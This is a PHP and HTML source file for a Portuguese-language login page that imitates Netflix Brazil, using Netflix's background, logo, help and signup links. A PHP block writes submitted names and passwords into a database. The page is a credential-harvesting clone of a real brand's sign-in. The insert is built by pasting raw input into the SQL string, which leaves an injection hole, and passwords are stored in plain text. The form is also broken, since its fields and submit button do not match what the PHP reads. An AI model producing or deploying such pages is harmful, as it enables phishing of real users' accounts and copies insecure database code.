<?php
if(isset($_POST['submit'])) {
    require('config.php');
    $nome = $_POST['nome'];
    $senha = $_POST['senha'];
    $result = mysqli_query($conexao, "INSERT INTO usuarios(nome, senha) values('$nome', '$senha')");
    }    
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://i.pinimg.com/originals/0f/66/dc/0f66dc3fe8ea994a70ed78472b2aa50f.png" rel="icon"> 
    <title>Login</title>
</head>

<style>
.body{
    background-image:url(https://assets.nflxext.com/ffe/siteui/vlv3/e89c9679-2f5f-491d-924c-c58924a8ee4b/f9c4098e-22e1-4b5c-b668-47519ee56dc7/BR-pt-20221121-popsignuptwoweeks-perspective_alpha_website_large.jpg);
    background-color:transparent;
    background-size:124%;
    background-repeat:no-repeat;
    overflow-y:scroll;
}

.form{
    height:600px;
    width:400px;
    background-color:rgba(0,0,0,.75);
    border-radius:5px;
    margin-left:550px;
    padding:30px;
    font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    color:white;
}
h1{
    text-align:left;
    margin-left:50px;
}
.inputs{
    padding:5px;
    border-radius:5px;
}
img{
    width:200px;
    height:100px;
    margin-left:4px;
}
.box{
    text-align:left;
    justify-content:left;
    align-items:left;
    margin-left:50px;
    float:left;
}
p{
    float:left;
}
</style>

<body class="body">
<img src="https://assets.stickpng.com/images/580b57fcd9996e24bc43c529.png">
<div class="form">
<h1>Entrar</h1>
    <form method="POST">
    <input type="email" placeholder="Email ou número de telefone" style="width:280px; height:45px; border-radius:5px; margin-bottom:10px; margin-left:50px; background-color:#333333; padding-left:20px; color:white; font-size:15px;" required/>
    <br/>
    <input type="password" name="senha" id="senha" placeholder="Senha" style=" width:280px; height:45px; border-radius:5px; background-color:#333333; padding-left:20px; margin-bottom:5px; margin-left:50px; font-size:15px;" required/>
    <br/>
    <button type="button" onclick="mostrarSenha()" style="width:auto; font-size:10px; margin-top:0; margin-left:52px; margin-bottom:30px;">MOSTRAR</button>
    <script>
    function mostrarSenha(){
    var tipo = document.getElementById("senha")
    if(tipo.type == "password"){
        tipo.type ="text";
    }else{
        tipo.type ="password";
    }
    }
    </script>
    <br/>
    <input type="submit" style="background-color:red; color:white; width:305px; height:45px; border-radius:5px; border:solid 1px black; margin-bottom:5px; margin-left:50px; font-weight:900; font-size:15px; "value="Entrar"/>
    <br/>
    <div class="box">
    <input type="checkbox" style="opacity:0.8" value="lembre-se de mim" style="margin-left:10px;"/>
    <label for="lembre-se de mim" style="font-size: 10px;">Lembre-se de mim</label>
    </div>
    <a href="https://www.netflix.com/br/LoginHelp" style="float:left; font-size:10px; margin-left:120px; color:white;"> Precisa de ajuda?</a>
    <p style="margin-left:50px; margin-top:60px; color:grey;">Novo por aqui? <a href="https://www.netflix.com/" style="color:white;">Assine agora.</a></p>
    <p style="margin-left:50px; margin-top:0; color:grey; font-size:13px; float:left;">Esta página é protegida pelo Google reCAPTCHA paragarantir que você não é um robô. <p style="color:blue; margin-left:50px; margin-top:0 ;">Saiba mais.</p>
    </form>
</div>
</body>
</html>
